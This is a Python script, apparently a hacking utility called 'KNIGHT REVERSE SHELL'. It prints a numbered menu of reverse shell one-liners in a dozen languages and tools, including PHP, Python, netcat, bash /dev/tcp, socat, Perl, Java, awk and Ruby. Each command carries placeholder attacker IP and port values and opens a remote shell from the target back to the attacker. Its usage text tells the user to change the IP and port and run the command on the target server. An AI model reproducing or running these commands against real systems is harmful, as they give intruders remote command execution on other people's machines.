INFO = "\n[+] INFORMATION: \n\t IP-ADDRESS = TERGET SERVER IP \n\t PORT = TERGET SERVER PORT"
info = "\n[+] INFO:\n\tA reverse shell is a type of shell in which the target machine communicates back\n\t to the attacking machine. The attacking machine has a listener port on which it\n\t receives the connection, which by using, code or command execution is achieved."
USAG = "\n[+] USAGE:\n\tIt is use reverse shell connection. you first copy shell then change ip and port number.\n\t And use target server reverse connection"

print('''
 _____  ________      ________ _____   _____ ______    _____ _    _ ______ _      _      
 |  __ \|  ____\ \    / /  ____|  __ \ / ____|  ____|  / ____| |  | |  ____| |    | |     
 | |__) | |__   \ \  / /| |__  | |__) | (___ | |__    | (___ | |__| | |__  | |    | |     
 |  _  /|  __|   \ \/ / |  __| |  _  / \___ \|  __|    \___ \|  __  |  __| | |    | |     
 | | \ \| |____   \  /  | |____| | \ \ ____) | |____   ____) | |  | | |____| |____| |____ 
 |_|  \_\______|   \/   |______|_|  \_\_____/|______| |_____/|_|  |_|______|______|______|
''')
print("\t\tKNIGHT REVERSE SHELL")
print("\t\t\t@KNIGHT_VI (RD DURJOY)")

a = '''
===============================
1.  PHP REVERSE SHELL          
2.  PYTHON REVERSE SHELL       
3.  NETCAT REVERSE SHELL        
4.  GOLANG REVERSE SHELL   
5.  BASH REVERSE SHELL
6.  SOCKET REVERSE SHELL
7.  PERL REVERSE SHELL
8.  NCAT REVERSE SHELL
9.  JAVA REVERSE SHELL
10. AWK REVERSE SHELL
11. XTERM REVERSE SHELL
12. RUBY REVERSE SHELL     
===============================
'''


print(a)

try:
    a_input = int(input("ENTER YOUR NUMBER: "))

    if a_input==1:
        print(INFO)
        print("\n[+] PHP REVERSE SHELL:")
        a_c = '''php -r '$sock=fsockopen("ip-address",port);exec("/bin/sh -i <&3 >&3 2>&3");' '''
        print('\t'+a_c+'\n')
        print(info+'\n')
        print(USAG+'\n')


    elif a_input==2:
        print(INFO)
        print("\n[+] PYTHON REVERSE SHELL:")
        a_c = '''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip-address",port));os.dup2(s.fileno(),0); \n\tos.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''
        print('\t'+a_c+'\n')
        print(info+'\n')
        print(USAG+'\n')


    elif a_input==3:
        print(INFO)
        print("\n[+] NETCAT REVERSE SHELL 01:")
        a_c = '''nc  ip-address port -e /bin/sh'''
        print('\t'+a_c+'\n')
        print("\n[+] NETCAT REVERSE SHELL 02:")
        a_d = '''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip-address port >/tmp/f'''
        print('\t'+a_d+'\n')
        print(info+'\n')
        print(USAG+'\n')


    elif a_input==4:
        print(INFO)
        print("\n[+] GOLANG REVERSE SHELL:")
        a_c = '''echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ip-address:port");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;\n\tcmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go'''
        print('\t'+a_c+'\n')
        print(info+'\n')
        print(USAG+'\n')


    elif a_input==5:
        print(INFO)
        print("\n[+] BASH TCP REVERSE SHELL 01:")
        a_d = '''bash -i >& /dev/tcp/ip-address/port 0>&1'''
        print('\t'+a_d+'\n')
        print("\n[+] BASH TCP REVERSE SHELL 02:")
        a_c = '''0<&196;exec 196<>/dev/tcp/ip-address/port; sh <&196 >&196 2>&196'''
        print('\t'+a_c+'\n')
        print("\n[+] BASH UDP REVERSE SHELL 03:")
        a_e = '''sh -i >& /dev/udp/ip-address/port 0>&1'''
        print('\t'+a_e+'\n')
        print(info+'\n')
        print(USAG+'\n')   


    elif a_input==6:
        print(INFO)
        print("\n[+] SOCKET REVERSE SHELL:")
        a_d = '''ATTACKER PAYLOAD LISTENER'''
        print('\t'+a_d)
        a_c = '''socat file:`tty`,raw,echo=0 TCP-L:port'''
        print('\t\t'+a_c+'\n')
        a_e = '''CLIENT SIDE'''
        print('\t'+a_e)
        a_f = '''/dev/shm exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ip-address:port'''
        print('\t\t'+a_f+'\n')
        print(info+'\n')
        print(USAG+'\n') 


    elif a_input==7:
        print(INFO)
        print("\n[+] PERL REVERSE SHELL:")
        a_c = ''' perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ip-address:port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' '''
        print('\t'+a_c+'\n')
        print(info+'\n')
        print(USAG+'\n')


    elif a_input==8:
        print(INFO)
        print("\n[+] NCAT REVERSE SHELL:")
        a_c = ''' nc  ip-address port -e /bin/sh '''
        print('\t'+a_c+'\n')
        print(info+'\n')
        print(USAG+'\n')


    elif a_input==9:
        print(INFO)
        print("\n[+] JAVA REVERSE SHELL:")
        a_c = '''r = Runtime.getRuntime()\n\tp = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/ip-address/port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
            p.waitFor()'''
        print('\t'+a_c+'\n')
        print(info+'\n')
        print(USAG+'\n')


    elif a_input==10:
        print(INFO)
        print("\n[+] AWK REVERSE SHELL:")
        a_c = '''awk 'BEGIN {s = "/inet/tcp/0/ip-address/port"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) \n\tprint $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null'''
        print('\t'+a_c+'\n')
        print(info+'\n')
        print(USAG+'\n')

    elif a_input==11:
        print(INFO)
        print("\n[+] XTERM REVERSE SHELL:")
        a_c = '''xterm -display ip-address:port'''
        print('\t'+a_c+'\n')
        print(info+'\n')
        print(USAG+'\n')


    elif a_input==12:
        print(INFO)
        print("\n[+] RUBY REVERSE SHELL:")
        a_c = ''' ruby -rsocket -e'f=TCPSocket.open("ip-address",port).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''
        print('\t'+a_c+'\n')
        print(info+'\n')
        print(USAG+'\n')

    else:
        print('\n\t NOTE:',a_input,'NOT AVAILABLE HERE PLEASE TRY ANOTHER INPUT \n')

except ValueError:
    print("\n\tWrong Input\n")


